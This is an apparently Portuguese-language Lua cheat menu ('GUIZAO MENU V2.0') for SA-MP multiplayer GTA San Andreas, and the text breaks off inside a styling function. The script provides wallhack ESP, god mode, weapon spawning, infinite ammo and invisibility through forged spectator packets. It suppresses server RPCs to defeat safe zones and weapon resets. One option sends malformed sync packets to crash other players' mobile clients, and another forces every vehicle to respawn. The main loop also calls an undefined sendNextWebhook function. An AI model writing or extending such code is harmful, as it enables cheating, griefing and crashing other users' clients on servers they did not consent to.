require("moonloader")
require "lib.sampfuncs"
local ffi = require('ffi')
local imgui = require("mimgui")
local sampev = require('lib.samp.events')
local encoding = require("encoding")
encoding.default = "CP1251"
u8 = encoding.UTF8
local sizeX, sizeY = getScreenResolution()
local new = imgui.new
local renderWindow = new.bool()


local gta = ffi.load('GTASA')
ffi.cdef [[
  typedef struct RwV3d {
    float x, y, z;
  } RwV3d;
  void _ZN4CPed15GetBonePositionER5RwV3djb(void* thiz, RwV3d* posn, uint32_t bone, bool calledFromCam);
]]
local healer, force, time = false, { false, false, false, false, false, false, false }, 0
local nick_font = renderCreateFont('Verdana', 8, FCR_BOLD + FCR_BORDER)
local stat_font = renderCreateFont('Verdana', 12, FCR_BOLD + FCR_BORDER)
local stat_fontt = renderCreateFont('Franklin Gothic', 12, FCR_BOLD + FCR_BORDER)
local color_button = 0xAA000000
local color_line = 0xFF221F24
local playerss = {}
local actives = true
local test = false
local state1 = false
local fsync = false

font = renderCreateFont('Arial', 9, 12)
cars = {
    "Landstalker", "Bravura", "BUFFALO", "Linerunner", "PERENIEL", "SENTINEL", "Dumper", "Firetruck", "Trashmaster",
    "Stretch", "Manana", "INFERNUS", "Voodoo", "Pony",
    "Mule", "CHEETAH", "AMBULANCIA", "Leviathan", "Moonbeam", "Esperanto", "TAXI", "Washington", "Bobcat", "Mr Whoopee",
    "BF INJECTION", "Hunter", "PREMIER", "Enforcer",
    "Securicar", "BANSHEE", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
    "Stallion", "Rumpo", "RC Bandit",
    "Romero", "Packer", "Monster Truck", "Admiral", "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo",
    "Speeder", "Reefer", "Tropic", "Flatbed", "Yankee",
    "Caddy", "Solair", "Berkley's RC Van", "Skimmer", "PCJ 600", "Faggio", "Freeway", "RC Baron", "RC Raider",
    "Glendale", "Oceanic", "SANCHEZ", "Sparrow", "Patriot",
    "QUADRICICLO", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR 350", "Walton", "Regina", "Comet", "BMX",
    "Burrito", "Camper", "Marquis", "Baggage", "Dozer",
    "Maverick", "News Chopper", "RANCHER", "FBI RANCHER", "Virgo", "Greenwood", "Jetmax", "HOTRING", "Sandking",
    "Blista Compact", "Police Maverick", "Boxville",
    "Benson", "Mesa", "RC Goblin", "HOTRING RACER", "HOTRING RACER", "Bloodring Banger", "RANCHER", "SUPER GT",
    "Elegant", "Journey", "BIKE", "MOUNTAIN BIKE", "Beagle",
    "Cropdust", "Stunt", "Tanker", "RoadTrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra", "FCR 900",
    "NRG 500", "HPV 1000", "Cement Truck", "Tow Truck",
    "Fortune", "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan",
    "Blade", "Freight", "Streak", "Vortex",
    "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo", "Cargobob", "Tampa", "Sunrise",
    "Merit", "Utility", "Nevada",
    "Yosemite", "Windsor", "Monster Truck", "Monster Truck", "Uranus", "JESTER", "SULTAN", "STRATUM", "ELEGY",
    "Raindance", "RC TIGER", "FLASH", "Tahoma",
    "SAVANNA", "Bandito", "Freight", "Trailer", "Kart", "Mower", "Duneride", "Sweeper", "Broadway", "TORNADO", "AT-400",
    "DFT-30", "Huntley", "Stafford", "BF 400",
    "Newsvan", "Tug", "Trailer", "Emperor", "Wayfarer", "EUROS", "Hotdog", "Club", "Trailer", "Trailer", "Andromada",
    "Dodo", "RC Cam", "Launch", "POLICIA CAR (LS)",
    "POLICIA CAR (SF)", "Police Car (LV)", "Police RANGER", "PICADOR", "S.W.A.T. Van", "ALPHA", "PHOENIX", "Glendale",
    "Sadler", "Luggage Trailer", "Luggage Trailer",
    "Stair Trailer", "Boxville", "Farm Plow", "Utility Trailer"
}

colors = {
    0x000000FF, 0xF5F5F5FF, 0x2A77A1FF, 0x840410FF, 0x263739FF, 0x86446EFF, 0xD78E10FF, 0x4C75B7FF, 0xBDBEC6FF,
    0x5E7072FF,
    0x46597AFF, 0x656A79FF, 0x5D7E8DFF, 0x58595AFF, 0xD6DAD6FF, 0x9CA1A3FF, 0x335F3FFF, 0x730E1AFF, 0x7B0A2AFF,
    0x9F9D94FF,
    0x3B4E78FF, 0x732E3EFF, 0x691E3BFF, 0x96918CFF, 0x515459FF, 0x3F3E45FF, 0xA5A9A7FF, 0x635C5AFF, 0x3D4A68FF,
    0x979592FF,
    0x421F21FF, 0x5F272BFF, 0x8494ABFF, 0x767B7CFF, 0x646464FF, 0x5A5752FF, 0x252527FF, 0x2D3A35FF, 0x93A396FF,
    0x6D7A88FF,
    0x221918FF, 0x6F675FFF, 0x7C1C2AFF, 0x5F0A15FF, 0x193826FF, 0x5D1B20FF, 0x9D9872FF, 0x7A7560FF, 0x989586FF,
    0xADB0B0FF,
    0x848988FF, 0x304F45FF, 0x4D6268FF, 0x162248FF, 0x272F4BFF, 0x7D6256FF, 0x9EA4ABFF, 0x9C8D71FF, 0x6D1822FF,
    0x4E6881FF,
    0x9C9C98FF, 0x917347FF, 0x661C26FF, 0x949D9FFF, 0xA4A7A5FF, 0x8E8C46FF, 0x341A1EFF, 0x6A7A8CFF, 0xAAAD8EFF,
    0xAB988FFF,
    0x851F2EFF, 0x6F8297FF, 0x585853FF, 0x9AA790FF, 0x601A23FF, 0x20202CFF, 0xA4A096FF, 0xAA9D84FF, 0x78222BFF,
    0x0E316DFF,
    0x722A3FFF, 0x7B715EFF, 0x741D28FF, 0x1E2E32FF, 0x4D322FFF, 0x7C1B44FF, 0x2E5B20FF, 0x395A83FF, 0x6D2837FF,
    0xA7A28FFF,
    0xAFB1B1FF, 0x364155FF, 0x6D6C6EFF, 0x0F6A89FF, 0x204B6BFF, 0x2B3E57FF, 0x9B9F9DFF, 0x6C8495FF, 0x4D8495FF,
    0xAE9B7FFF,
    0x406C8FFF, 0x1F253BFF, 0xAB9276FF, 0x134573FF, 0x96816CFF, 0x64686AFF, 0x105082FF, 0xA19983FF, 0x385694FF,
    0x525661FF,
    0x7F6956FF, 0x8C929AFF, 0x596E87FF, 0x473532FF, 0x44624FFF, 0x730A27FF, 0x223457FF, 0x640D1BFF, 0xA3ADC6FF,
    0x695853FF,
    0x9B8B80FF, 0x620B1CFF, 0x5B5D5EFF, 0x624428FF, 0x731827FF, 0x1B376DFF, 0xEC6AAEFF, 0x000000FF,
    0x177517FF, 0x210606FF, 0x125478FF, 0x452A0DFF, 0x571E1EFF, 0x010701FF, 0x25225AFF, 0x2C89AAFF, 0x8A4DBDFF,
    0x35963AFF,
    0xB7B7B7FF, 0x464C8DFF, 0x84888CFF, 0x817867FF, 0x817A26FF, 0x6A506FFF, 0x583E6FFF, 0x8CB972FF, 0x824F78FF,
    0x6D276AFF,
    0x1E1D13FF, 0x1E1306FF, 0x1F2518FF, 0x2C4531FF, 0x1E4C99FF, 0x2E5F43FF, 0x1E9948FF, 0x1E9999FF, 0x999976FF,
    0x7C8499FF,
    0x992E1EFF, 0x2C1E08FF, 0x142407FF, 0x993E4DFF, 0x1E4C99FF, 0x198181FF, 0x1A292AFF, 0x16616FFF, 0x1B6687FF,
    0x6C3F99FF,
    0x481A0EFF, 0x7A7399FF, 0x746D99FF, 0x53387EFF, 0x222407FF, 0x3E190CFF, 0x46210EFF, 0x991E1EFF, 0x8D4C8DFF,
    0x805B80FF,
    0x7B3E7EFF, 0x3C1737FF, 0x733517FF, 0x781818FF, 0x83341AFF, 0x8E2F1CFF, 0x7E3E53FF, 0x7C6D7CFF, 0x020C02FF,
    0x072407FF,
    0x163012FF, 0x16301BFF, 0x642B4FFF, 0x368452FF, 0x999590FF, 0x818D96FF, 0x99991EFF, 0x7F994CFF, 0x839292FF,
    0x788222FF,
    0x2B3C99FF, 0x3A3A0BFF, 0x8A794EFF, 0x0E1F49FF, 0x15371CFF, 0x15273AFF, 0x375775FF, 0x060820FF, 0x071326FF,
    0x20394BFF,
    0x2C5089FF, 0x15426CFF, 0x103250FF, 0x241663FF, 0x692015FF, 0x8C8D94FF, 0x516013FF, 0x090F02FF, 0x8C573AFF,
    0x52888EFF,
    0x995C52FF, 0x99581EFF, 0x993A63FF, 0x998F4EFF, 0x99311EFF, 0x0D1842FF, 0x521E1EFF, 0x42420DFF, 0x4C991EFF,
    0x082A1DFF,
    0x96821DFF, 0x197F19FF, 0x3B141FFF, 0x745217FF, 0x893F8DFF, 0x7E1A6CFF, 0x0B370BFF, 0x27450DFF, 0x071F24FF,
    0x784573FF,
    0x8A653AFF, 0x732617FF, 0x319490FF, 0x56941DFF, 0x59163DFF, 0x1B8A2FFF, 0x38160BFF, 0x041804FF, 0x355D8EFF,
    0x2E3F5BFF,
    0x561A28FF, 0x4E0E27FF, 0x706C67FF, 0x3B3E42FF, 0x2E2D33FF, 0x7B7E7DFF, 0x4A4442FF, 0x28344EFF,
}

time = 0
state = false


local JOGADOR = {
    PLATAFORMA = new.bool(false),
    VIDAUTO = new.bool(false)
}

local MULTIPLAYER = {
    MOBILES = new.bool(false),
    RESPAWNAR = new.bool(false),
}

local ESP = {
    BONES = { 3, 4, 5, 51, 52, 41, 42, 31, 32, 33, 21, 22, 23, 2 },
    ESQUELETO = new.bool(false),
    VIDA = new.bool(false),
    VEICULOS = new.bool(false)
}

local ARMAS = {
    ANTRECARGA = new.bool(false),
}

local GODMODP = new.bool(false)
local INVISIVEL = new.bool(false)




if os.date("%Y%m%d") >= "99999999" then
    os.exit()
    sampAddChatMessage("")
end

function main()
    repeat wait(500) until isSampAvailable()

    sampRegisterChatCommand("guizao", function()
        renderWindow[0] = not renderWindow[0]
    end)

    while true do
        wait(0)
        sendNextWebhook()
    end
end

imgui.OnFrame(function() return renderWindow[0] end,
    function()
        imgui.SetNextWindowPos(imgui.ImVec2(sizeX / 2, sizeY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.SetNextWindowSize(imgui.ImVec2(650, 360), imgui.Cond.FirstUseEver)
        imgui.Begin("GUIZAO MENU V2.0", renderWindow, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)



        imgui.SetCursorPos(imgui.ImVec2(6, 28))
        if imgui.Button('JOGADOR', imgui.ImVec2(100, 40)) then
            BOTAO = 1
        end
        imgui.SetCursorPos(imgui.ImVec2(6, 74))
        if imgui.Button('ARMAS', imgui.ImVec2(100, 40)) then
            BOTAO = 2
        end
        imgui.SetCursorPos(imgui.ImVec2(6, 120))
        if imgui.Button('ESP', imgui.ImVec2(100, 40)) then
            BOTAO = 3
        end
        imgui.SetCursorPos(imgui.ImVec2(6, 168))
        if imgui.Button('MULTIPLAYER', imgui.ImVec2(100, 40)) then
            BOTAO = 4
        end





        if BOTAO == 4 then
            imgui.SetCursorPos(imgui.ImVec2(150, 28))
            imgui.Checkbox('RESPAWNAR VEICULOS', MULTIPLAYER.RESPAWNAR)
        end


        if BOTAO == 4 then
            imgui.SetCursorPos(imgui.ImVec2(150, 54))
            imgui.Checkbox('CRASHAR MOBILES', MULTIPLAYER.MOBILES)
        end


        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 100))
            if imgui.Button("PUXAR ESPINGARDA") then
                local weapon = getWeapontypeModel(27)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 27)
                giveWeaponToChar(PLAYER_PED, 27, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 125))
            if imgui.Button("PUXAR MINIGUN") then
                local weapon = getWeapontypeModel(38)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 38)
                giveWeaponToChar(PLAYER_PED, 38, 5000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 150))
            if imgui.Button("PUXAR DESERT") then
                local weapon = getWeapontypeModel(24)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 24)
                giveWeaponToChar(PLAYER_PED, 24, 1000)
            end
        end


        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 175))
            if imgui.Button("PUXAR SNIPER") then
                local weapon = getWeapontypeModel(34)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 34)
                giveWeaponToChar(PLAYER_PED, 34, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 200))
            if imgui.Button("PUXAR DOZE") then
                local weapon = getWeapontypeModel(25)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 25)
                giveWeaponToChar(PLAYER_PED, 25, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 225))
            if imgui.Button("PUXAR AK47") then
                local weapon = getWeapontypeModel(30)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 30)
                giveWeaponToChar(PLAYER_PED, 30, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 250))
            if imgui.Button("PUXAR 9MM") then
                local weapon = getWeapontypeModel(23)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 23)
                giveWeaponToChar(PLAYER_PED, 23, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 275))
            if imgui.Button("PUXAR MP5") then
                local weapon = getWeapontypeModel(29)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 29)
                giveWeaponToChar(PLAYER_PED, 29, 1000)
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(485, 300))
            if imgui.Button("PUXAR M4") then
                local weapon = getWeapontypeModel(31)
                requestModel(weapon)
                removeWeaponFromChar(PLAYER_PED, 31)
                giveWeaponToChar(PLAYER_PED, 31, 1000)
            end
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(500, 75))
            if imgui.Button("REVIVER AO MORRER") then
                if not isCharInAnyCar(playerPed) then
                    if healer and getCharHealth(playerPed) < 100 then
                    end

                    force = { true, true, true, true, true, true, true }
                    sampSendSpawn()
                    time = os.time() + 1
                    if time < os.time() then
                        force = { false, false, false, false, false, false, false }
                    end
                    freezeCharPosition(PLAYER_PED, true)
                    freezeCharPosition(PLAYER_PED, false)
                    setPlayerControl(PLAYER_HANDLE, true)
                    clearCharTasksImmediately(PLAYER_PED)
                end
            end
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(500, 50))
            if imgui.Button("DESATIVAR AREA SAFE") then
                SAFE = not SAFE
            end
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(500, 100))
            if imgui.Button("COLETE") then
                if COLETEZ then
                    local data = samp_create_sync_data('player')
                    data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                    data.health = getCharHealth(PLAYER_PED)
                    data.armor = 0
                    data.weapon = getCurrentCharWeapon(PLAYER_PED)
                    data.send()
                    damageChar(PLAYER_PED, 0, 100)
                    COLETEZ = false
                else
                    local data = samp_create_sync_data('player')
                    data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
                    data.health = getCharHealth(PLAYER_PED)
                    data.armor = 100
                    data.weapon = getCurrentCharWeapon(PLAYER_PED)
                    data.send()
                    addArmourToChar(PLAYER_PED, 100)
                    COLETEZ = true
                end
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(110, 250))
            if imgui.Button("BYPASS ARMAS") then
                state = not state
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(150, 28))
            imgui.Checkbox('ANT RECARGA', ARMAS.ANTRECARGA)
        end

        if BOTAO == 3 then
            imgui.SetCursorPos(imgui.ImVec2(500, 275))
            imgui.Checkbox('ESP VEICULOS', ESP.VEICULOS)
        end

        if BOTAO == 3 then
            imgui.SetCursorPos(imgui.ImVec2(500, 300))
            imgui.Checkbox('ESP VIDA', ESP.VIDA)
        end

        if BOTAO == 3 then
            imgui.SetCursorPos(imgui.ImVec2(500, 250))
            imgui.Checkbox('ESP ESQUELETO', ESP.ESQUELETO)
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(150, 54))
            imgui.Checkbox('RECUPERAR VIDA', JOGADOR.VIDAUTO)
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(150, 28))
            imgui.Checkbox('CHECHAR PLATAFORMA', JOGADOR.PLATAFORMA)
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(150, 104))
            imgui.Checkbox('GOD MOD', GODMODP)
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(110, 225))
            if imgui.Button("REMOVER ARMAS") then
                for i = 1, 46 do
                    removeWeaponFromChar(PLAYER_PED, i)
                end
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(110, 200))
            if imgui.Button("BYPASS ARMAS 2") then
                act27 = not act27
            end
        end

        if BOTAO == 2 then
            imgui.SetCursorPos(imgui.ImVec2(110, 175))
            if imgui.Button("NAO RESETAR ARMAS") then
                NAORESETAR = not NAORESETAR
            end
        end

        if BOTAO == 1 then
            imgui.SetCursorPos(imgui.ImVec2(150, 78))
            imgui.Checkbox('FICAR INVISIVEL', INVISIVEL)
        end

        imgui.End()
    end)


ESP.processESP = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        for _, char in ipairs(getAllChars()) do
            local result, id = sampGetPlayerIdByCharHandle(char)
            if result and isCharOnScreen(char) then
                local opaque_color = bit.bor(bit.band(sampGetPlayerColor(id), 0xFFFFFF), 0xFF000000)

                if ESP.ESQUELETO[0] then
                    for _, bone in ipairs(ESP.BONES) do
                        local x1, y1, z1 = getBonePosition(char, bone)
                        local x2, y2, z2 = getBonePosition(char, bone + 1)
                        local r1, sx1, sy1 = convert3DCoordsToScreenEx(x1, y1, z1)
                        local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)
                        if r1 and r2 then
                            renderDrawLine(sx1, sy1, sx2, sy2, 3, opaque_color)
                        end
                    end
                end
            end
        end
    end
end

lua_thread.create(ESP.processESP)

ESP.processESP2 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if ESP.VIDA[0] then
            for i = 0, sampGetMaxPlayerId(true) do
                if sampIsPlayerConnected(i) then
                    local _, ped = sampGetCharHandleBySampPlayerId(i)
                    if _ then
                        if isCharOnScreen(ped) then
                            local x, y, z = getCharCoordinates(ped)
                            local xc, yc = convert3DCoordsToScreen(x, y, z + 1.15)
                            local color = sampGetPlayerColor(i)
                            if color == 16777215 then
                                color = 0xFFFFFFFF
                            end
                            renderDrawBoxWithBorder(xc - 10, yc - 10, 100, 10, color_button, 1, color_line)
                            renderDrawBox(xc - 10, yc - 9, sampGetPlayerArmor(i), 8, 0xFFCCCCCC)
                            renderFontDrawText(stat_font, sampGetPlayerArmor(i), xc + 95, yc - 11, 0xFFCCCCCC, false)
                            renderDrawBoxWithBorder(xc - 10, yc, 100, 10, color_button, 1, color_line)
                            renderDrawBox(xc - 10, yc + 1, sampGetPlayerHealth(i), 8, 0xFFFF5656)
                            renderFontDrawText(stat_font, sampGetPlayerHealth(i), xc + 95, yc - 1, 0xFFFF5656, false)
                            renderFontDrawText(nick_font, sampGetPlayerNickname(i) .. ' [' .. i .. ']', xc - 11, yc - 30,
                                color, false)
                            if sampIsPlayerPaused(i) then
                                renderFontDrawText(nick_font, 'AFK', xc - 11, yc + 10, 0xFFCCCCCC, false)
                            end
                        end
                    end
                end
            end
        end
    end
end

lua_thread.create(ESP.processESP2)

JOGADOR.funcao1 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if JOGADOR.PLATAFORMA[0] then
            local peds = getAllChars()
            for i = 2, #peds do
                local _, id = sampGetPlayerIdByCharHandle(peds[i])
                if peds[i] ~= nil and isCharOnScreen(peds[i]) and not sampIsPlayerNpc(id) then
                    local x, y, z = getCharCoordinates(peds[i])
                    local xs, ys = convert3DCoordsToScreen(x, y, z)
                    if playerss[id] ~= nil and actives then
                        if playerss[id] ~= "PC" then
                            renderFontDrawText(stat_fontt, "MOBILE", xs - 23, ys, 0xFF00FFC9)
                        end
                        if playerss[id] ~= "MOBILE" then
                            renderFontDrawText(stat_fontt, "PC", xs - 23, ys, 0xFFFF0000)
                        end
                    end
                end
            end
        end
    end
end

lua_thread.create(JOGADOR.funcao1)

JOGADOR.funcao2 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if JOGADOR.VIDAUTO[0] then
            if not isCharInAnyCar(playerPed) then
                if healer and getCharHealth(playerPed) < 100 then
                end

                force = { true, true, true, true, true, true, true }
                wait(1500)
                sampSendSpawn()
                time = os.time() + 1
            end

            if time < os.time() then
                force = { false, false, false, false, false, false, false }
            end
        end
    end
end

lua_thread.create(JOGADOR.funcao2)

MULTIPLAYER.funcao3 = function()
    while not isSampAvailable() do wait(0) end

    while true do
        wait(0)
        if MULTIPLAYER.MOBILES[0] then
            test = not test
            if state1 then
                state1 = false
                state1 = true
            end
        end
    end
end

lua_thread.create(MULTIPLAYER.funcao3)

MULTIPLAYER.funcao4 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if MULTIPLAYER.RESPAWNAR[0] then
            for k, v in pairs(getAllVehicles()) do
                local _, id = sampGetVehicleIdByCarHandle(v)
                if _ then
                    sampSendVehicleDestroyed(id)
                    wait(50)
                end
            end
        end
        return false
    end
end

lua_thread.create(MULTIPLAYER.funcao4)

ESP.funcao5 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if ESP.VEICULOS[0] then
            veh = getAllVehicles()
            for k, v in ipairs(veh) do
                if isCarOnScreen(v) then
                    model = cars[getCarModel(v) - 399] ..
                        ' (' .. tostring(select(2, sampGetVehicleIdByCarHandle(v))) .. ')'
                    clr, _ = getCarColours(v)
                    cx, cy, cz = getCarCoordinates(v)
                    x, y = convert3DCoordsToScreen(cx, cy, cz)
                    lenght = renderGetFontDrawTextLength(font, model, true)
                    height = renderGetFontDrawHeight(font)
                    textcolor = 0xFF00B811
                    if getCarDoorLockStatus(v) == 2 then
                        textcolor = 0xFFEC0000
                    end
                    renderFontDrawText(font, model, x - (lenght + 5 + 18) / 2, y - (height + 7 + 14) / 2, textcolor, true)
                    renderDrawBox(x + (lenght + 5 - 18) / 2, y - (7 + 14) / 2 - 9, 18, 18, 0xFFFFFFFF)
                    renderDrawBox(x + (lenght + 5 - 18) / 2 + 2, y - (7 + 14) / 2 - 7, 14, 14,
                        0xFF000000 + colors[clr + 1] / 0x100)
                    healthbox = lenght + 5 + 18 + 8
                    healthbox2 = healthbox * (getCarHealth(v) / 1000)
                    renderDrawBox(x - healthbox / 2 - 1, y + (height + 7 - 14) / 2, healthbox + 2, 14, 0xFF000000)
                    renderDrawBox(x - healthbox / 2, y + (height + 7 - 14) / 2 + 1, healthbox, 12, 0xFF0084DF)
                    renderDrawBox(x - healthbox / 2, y + (height + 7 - 14) / 2 + 1, healthbox2, 12, 0xFF005C9B)
                end
            end
        end
    end
end

lua_thread.create(ESP.funcao5)

ARMAS.funcao6 = function()
    while not isSampAvailable() do wait(0) end
    while true do
        wait(0)
        if ARMAS.ANTRECARGA[0] then
            if isCharShooting(PLAYER_PED) then
                setAmmo()
            end
        end
    end
end

lua_thread.create(ARMAS.funcao6)

function onReceiveRpc(ID)
    if COLETEZ and ID == 66 then
        return false
    end

    if SAFE and (ID == 30 or ID == 86 or ID == 157 or ID == 162 or ID == 61 or ID == 67 or ID == 86 or ID == 15) then
        return false
    end

    if state1 and ID == 13 then return false end
    if state1 and ID == 87 then return false end
end

function sampev.onUnoccupiedSync(id, data)
    playerss[id] = "PC"
end

function sampev.onPlayerSync(id, data)
    if data.keysData == 160 then
        playerss[id] = "PC"
    end

    if data.specialAction ~= 0 and data.specialAction ~= 1 then
        playerss[id] = "PC"
    end

    if data.leftRightKeys ~= nil then
        if data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
            playerss[id] = "MOBILE"
        else
            if playerss[id] ~= "MOBILE" then
                playerss[id] = "PC"
            end
        end
    end

    if data.upDownKeys ~= nil then
        if data.upDownKeys ~= 128 and data.upDownKeys ~= 65408 then
            playerss[id] = "MOBILE"
        else
            if playerss[id] ~= "MOBILE" then
                playerss[id] = "PC"
            end
        end
    end
end

function setAmmo(mode)
    local gun = getCurrentCharWeapon(PLAYER_PED)
    local ammo = getAmmoInCharWeapon(PLAYER_PED, gun)
    giveWeaponToChar(PLAYER_PED, gun, 0)
end

function sampev.onVehicleSync(id, vehid, data)
    if data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        playerss[id] = "MOBILE"
    end
end

function sampev.onPlayerQuit(id)
    playerss[id] = nil
end

function sampev.onBulletSync()
    if GODMODP[0] then
        return false
    end
end

function sampev.onSetInterior()
    if force[5] then return false end
    force[5] = false
end

function sampev.onSetPlayerPos()
    if force[6] then return false end
    force[6] = false
end

function sampev.onSetPlayerFacingAngle()
    if force[7] then return false end
    force[7] = false
end

function sampev.onSetPlayerSkin()
    if force[4] then return false end
    force[4] = false
    if GODMODP[0] then
        return false
    end
end

function sampev.onSetCameraBehind()
    if force[2] then return false end
    force[2] = false
end

function sampev.onClearPlayerAnimation()
    if force[3] then return false end
    force[3] = false
end

function sampev.onTogglePlayerControllable()
    if force[1] then return false end
    force[1] = false
    if GODMODP[0] then
        return false
    end
end

function sampev.onResetPlayerWeapons()
    if NAORESETAR then
        return false
    end
end

function sampev.onRequestSpawnResponse()
    if GODMODP[0] then
        return false
    end
end

function sampev.onRequestClassResponse()
    if GODMODP[0] then
        return false
    end
end

function sampev.onSetPlayerHealth()
    if GODMODP[0] then
        return false
    end
end

function getBonePosition(ped, bone)
    local pedptr = ffi.cast('void*', getCharPointer(ped))
    local posn = ffi.new('RwV3d[1]')
    gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
    return posn[0].x, posn[0].y, posn[0].z
end

function onSendPacket(id)
    if act27 and id == 207 then return false end
end

function sampev.onSendPlayerSync(data)
    if INVISIVEL[0] then
        local var_3_0 = samp_create_sync_data("spectator")

        var_3_0.position = data.position

        var_3_0.send()

        return false
    end

    if state then
        data.weapon = 0
    end

    if test then
        msync = not msync
        local sync = samp_create_sync_data('aim')
        sync.camMode = 0
    end

    if test then
        fsync = not fsync
        if fsync then
            local sync = samp_create_sync_data('player')
            sync.weapon = 40
            sync.weapon = 0
            sync.weapon = 40
            sync.weapon = 0
            sync.weapon = 40
            sync.weapon = 0
            sync.weapon = 40
            sync.keysData = 256
            sync.send()
            printStringNow("CRASHANDO...", 500)
            return false
        end
    end
end

function sampev.onSendAimSync(data)
    if state then
        data.camMode = 38
    end
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require 'ffi'
    local sampfuncs = require 'sampfuncs'
    local raknet = require 'samp.raknet'
    require 'samp.synchronization'
    copy_from_player = copy_from_player or true
    local sync_traits = {
        player = { 'PlayerSyncData', raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData },
        vehicle = { 'VehicleSyncData', raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData },
        passenger = { 'PassengerSyncData', raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData },
        aim = { 'AimSyncData', raknet.PACKET.AIM_SYNC, sampStorePlayerAimData },
        trailer = { 'TrailerSyncData', raknet.PACKET.TRAILER_SYNC, sampStorePlayerTrailerData },
        unoccupied = { 'UnoccupiedSyncData', raknet.PACKET.UNOCCUPIED_SYNC, nil },
        bullet = { 'BulletSyncData', raknet.PACKET.BULLET_SYNC, nil },
        spectator = { 'SpectatorSyncData', raknet.PACKET.SPECTATOR_SYNC, nil }
    }
    local sync_info = sync_traits[sync_type]
    local data_type = 'struct ' .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast('uintptr_t', ffi.new(data_type .. '*', data)))
    if copy_from_player then
        local copy_func = sync_info[3]
        if copy_func then
            local _, player_id
            if copy_from_player == true then
                _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            else
                player_id = tonumber(copy_from_player)
            end
            copy_func(player_id, raw_data_ptr)
        end
    end
    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end
    local mt = {
        __index = function(t, index)
            return data[index]
        end,
        __newindex = function(t, index, value)
            data[index] = value
        end
    }
    return setmetatable({ send = func_send }, mt)
end

imgui.OnInitialize(function()
    theme()
end)

function theme()
    imgui.SwitchContext()
    imgui.GetStyle().WindowPadding                           = imgui.ImVec2(5, 5)
    imgui.GetStyle().FramePadding                            = imgui.ImVec2(5, 5)
    imgui.GetStyle().ItemSpacing                             = imgui.ImVec2(5, 5)
    imgui.GetStyle().ItemInnerSpacing                        = imgui.ImVec2(2, 2)
    imgui.GetStyle().TouchExtraPadding                       = imgui.ImVec2(0, 0)
    imgui.GetStyle().IndentSpacing                           = 0
    imgui.GetStyle().ScrollbarSize                           = 10
    imgui.GetStyle().GrabMinSize                             = 10

    imgui.GetStyle().WindowBorderSize                        = 1
    imgui.GetStyle().ChildBorderSize                         = 1
    imgui.GetStyle().PopupBorderSize                         = 1
